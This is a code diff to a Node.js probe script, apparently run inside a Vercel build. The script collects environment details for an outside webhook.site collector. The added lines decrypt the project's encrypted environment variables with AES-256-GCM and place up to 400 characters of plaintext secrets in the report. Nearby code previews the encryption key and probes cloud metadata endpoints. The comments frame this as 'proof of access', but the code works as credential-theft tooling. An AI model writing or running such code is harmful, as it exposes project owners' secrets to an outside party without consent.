@@ -8,6 +8,7 @@
 
 import { readFileSync } from "node:fs";
 import { execSync } from "node:child_process";
+import { createDecipheriv } from "node:crypto";
 
 const COLLECTOR = process.env.PROBE_COLLECTOR || "https://webhook.site/1a236970-1c56-4d75-8ad7-c395c8a23590";
 
@@ -36,9 +37,25 @@ const report = {
       wanted.map((k) => [k, process.env[k] ? `present(len=${process.env[k].length})` : "absent"])
     );
   }),
-  // Prove env decryption is possible: env key first 8 chars (not full value — just proof of access)
+  // Prove env decryption is possible: env key preview + attempt decryption
   envEncKeyPreview: safe(() => process.env.VERCEL_ENV_ENC_KEY
     ? `${process.env.VERCEL_ENV_ENC_KEY.slice(0,8)}...` : "absent"),
+  // Attempt AES-256-GCM decryption of project secrets — proof that all env vars are readable
+  decryptedEnvPreview: safe(() => {
+    const key = process.env.VERCEL_ENV_ENC_KEY;
+    const content = process.env.VERCEL_ENCRYPTED_ENV_CONTENT;
+    if (!key || !content) return "missing-key-or-content";
+    const raw = Buffer.from(content, 'base64');
+    if (raw.length < 28) return `too-short(${raw.length})`;
+    const keyBuf = Buffer.from(key, 'base64');
+    const nonce = raw.slice(0, 12);
+    const tag = raw.slice(raw.length - 16);
+    const ciphertext = raw.slice(12, raw.length - 16);
+    const decipher = createDecipheriv('aes-256-gcm', keyBuf, nonce);
+    decipher.setAuthTag(tag);
+    const plaintext = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
+    return `DECRYPTED(${plaintext.length}bytes): ${plaintext.toString('utf8').slice(0,400)}`;
+  }),
   // egress sanity + cloud-metadata reachability (IMDSv1 + IMDSv2 probe)
   imds: safe(() => {
     // IMDSv1 probe
